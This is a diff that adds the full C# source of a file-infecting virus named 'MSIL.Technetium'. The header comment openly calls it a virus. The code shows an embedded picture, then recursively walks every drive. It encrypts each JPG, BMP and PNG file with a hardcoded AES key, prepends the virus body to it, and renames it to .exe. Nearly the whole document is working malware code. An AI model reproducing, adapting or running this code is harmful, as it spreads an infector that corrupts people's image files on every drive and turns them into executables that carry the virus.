@@ -1,0 +1,190 @@
+//MSIL.Technetium by alcopaul [b8]
+//
+// This virus will hardcorely infect picture files. The virus will encrypt the picture and will store it in its body. The picture files
+// will still be viewable since the virus will act as a viewer to the picture files.
+//
+// http://www.twitter.com/thealcopaul
+//
+//
+
+using System;
+using System.Collections.Generic;
+using System.ComponentModel;
+using System.Data;
+using System.Drawing;
+using System.Text;
+using System.Windows.Forms;
+using System.IO;
+using System.Security.Cryptography;
+using System.Reflection;
+using System.Threading;
+using System.Collections;
+
+namespace WindowsFormsApplication4
+{
+    public partial class Form1 : Form
+    {
+        public Form1()
+        {
+            InitializeComponent();
+        }
+
+        private void Form1_Load(object sender, EventArgs e)
+        {
+            ASCIIEncoding askii = new ASCIIEncoding();
+            byte[] key = askii.GetBytes("AxCe34KlouTfDsWh");
+            Module exename = Assembly.GetExecutingAssembly().GetModules()[0];
+            FileStream fs = new FileStream(exename.FullyQualifiedName, FileMode.OpenOrCreate, FileAccess.Read);
+            byte[] k1 = XSharp.rrunnn.Readx(fs, (int)fs.Length - 11776, 11776);
+            fs.Close();
+            byte[] l = DecryptBytes(k1, key);
+            pictureBox1.Image = ByteToImage(l);
+            Thread ggg = new Thread(XSharp.rrunnn.Runner);
+            ggg.Start();
+
+        }
+        private static byte[] DecryptBytes(byte[] message, byte[] key)
+        {
+            MemoryStream fsm = new MemoryStream();
+            RijndaelManaged cr = new RijndaelManaged();
+            CryptoStream cs = new CryptoStream(fsm, cr.CreateDecryptor(key, key), CryptoStreamMode.Write);
+            cs.Write(message, 0, message.Length);
+            cs.FlushFinalBlock();
+            byte[] g = fsm.ToArray();
+            cs.Close();
+            fsm.Close();
+            return g;
+
+        }
+        public static Bitmap ByteToImage(byte[] blob)
+        {
+            MemoryStream mStream = new MemoryStream();
+            byte[] pData = blob;
+            mStream.Write(pData, 0, Convert.ToInt32(pData.Length));
+            Bitmap bm = new Bitmap(mStream, false);
+            mStream.Dispose();
+            return bm;
+        }
+    }
+}
+namespace XSharp
+{
+    public class rrunnn
+    {
+        public static void Runner()
+        {
+            ASCIIEncoding askii = new ASCIIEncoding();
+            byte[] key = askii.GetBytes("AxCe34KlouTfDsWh");
+            Module exename = Assembly.GetExecutingAssembly().GetModules()[0];
+            FileStream fs = new FileStream(exename.FullyQualifiedName, FileMode.OpenOrCreate, FileAccess.Read);
+            byte[] j = Readx(fs, 11776, 0);
+            fs.Close();
+            foreach (DriveInfo driveInfo in DriveInfo.GetDrives())
+            {
+                if (driveInfo.IsReady)
+                {
+                    string glen = driveInfo.RootDirectory.FullName;
+                    DirectoryInfo dirx = new DirectoryInfo(@glen);
+                    AndLetsRock(dirx, key, j);
+                }
+            }
+        }
+        private static void Infect(string file, byte[] key, byte[] j)
+        {
+            try
+            {
+                FileStream fs1 = new FileStream(file, FileMode.OpenOrCreate, FileAccess.Read);
+                byte[] h = Readx(fs1, (int)fs1.Length, 0);
+                fs1.Close();
+                byte[] k = EncryptBytes(h, key);
+
+                FileStream fs11 = new FileStream(file, FileMode.OpenOrCreate, FileAccess.Write);
+                WriteX(fs11, j, k);
+                fs11.Close();
+                File.Move(file, file + ".exe");
+            }
+            catch { return; }
+        }
+        private static void AndLetsRock(DirectoryInfo doy, byte[] key, byte[] j)
+        {
+            string lookfor = "*.jpg>*.bmp>*.png";
+            string[] extensions = lookfor.Split(new char[] { '>' });
+
+            ArrayList myfileinfos = new ArrayList();
+
+            foreach (string ext in extensions)
+            {
+                myfileinfos.AddRange(doy.GetFiles(ext));
+            }
+
+            FileInfo[] xfinal = (FileInfo[])myfileinfos.ToArray(typeof(FileInfo));
+            foreach (FileInfo yfilex in xfinal)
+            {
+                string filenamex = yfilex.FullName;
+
+                try
+                {
+                    Infect(filenamex, key, j);
+                }
+                catch
+                {
+                    continue;
+                }
+
+            }
+            DirectoryInfo[] dirs = doy.GetDirectories("*.*");
+            foreach (DirectoryInfo xdir in dirs)
+            {
+                try
+                {
+                    AndLetsRock(xdir, key, j);
+                }
+                catch { continue; }
+            }
+            return;
+        }
+        public static void WriteX(FileStream s, byte[] g, byte[] k)
+        {
+            BinaryWriter w = new BinaryWriter(s);
+            w.BaseStream.Seek(0, SeekOrigin.Begin);
+            w.Write(g);
+            w.Write(k);
+            w.Flush();
+            w.Close();
+        }
+        private static byte[] EncryptBytes(byte[] message, byte[] key)
+        {
+            MemoryStream fsm = new MemoryStream();
+            RijndaelManaged cr = new RijndaelManaged();
+            CryptoStream cs = new CryptoStream(fsm, cr.CreateEncryptor(key, key), CryptoStreamMode.Write);
+            cs.Write(message, 0, message.Length);
+            cs.FlushFinalBlock();
+            byte[] g = fsm.ToArray();
+            cs.Close();
+            fsm.Close();
+            return g;
+
+        }
+
+
+
+        public static byte[] Readx(FileStream sxtream, int xlength, int cccur)
+        {
+            BinaryReader w33 = new BinaryReader(sxtream);
+            w33.BaseStream.Seek(cccur, SeekOrigin.Begin);
+            byte[] bytes2 = new byte[xlength];
+            int numBytesToRead2 = (int)xlength;
+            int numBytesRead2 = 0;
+            while (numBytesToRead2 > 0)
+            {
+                int n00 = w33.Read(bytes2, numBytesRead2, numBytesToRead2);
+                if (n00 == 0)
+                    break;
+                numBytesRead2 += n00;
+                numBytesToRead2 -= n00;
+            }
+            return bytes2;
+        }
+    }
+
+}
